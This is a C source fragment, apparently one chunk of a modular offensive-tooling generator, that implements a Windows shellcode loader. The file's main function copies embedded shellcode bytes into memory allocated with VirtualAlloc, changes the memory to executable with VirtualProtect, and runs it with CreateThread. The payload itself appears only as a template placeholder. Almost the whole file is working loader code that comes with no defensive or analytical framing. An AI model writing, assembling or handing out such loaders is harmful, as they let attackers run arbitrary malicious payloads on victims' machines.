// chunk: arch/shellcode_loader_virtualalloc
// depends: (none)
// provides: main
// headers: windows.h
// note: Loads embedded shellcode via VirtualAlloc + CreateThread

#ifndef CHUNK_SHELLCODE_LOADER_VA
#define CHUNK_SHELLCODE_LOADER_VA

#include <windows.h>

// Shellcode bytes go here (replace with actual shellcode)
unsigned char shellcode_buf[] = {
    {{SHELLCODE_BYTES}}
};
unsigned int shellcode_len = sizeof(shellcode_buf);

int main(int argc, char *argv[]) {
    void *mem = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return 1;

    memcpy(mem, shellcode_buf, shellcode_len);

    DWORD old;
    VirtualProtect(mem, shellcode_len, PAGE_EXECUTE_READ, &old);

    HANDLE ht = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (ht) WaitForSingleObject(ht, INFINITE);

    return 0;
}

#endif
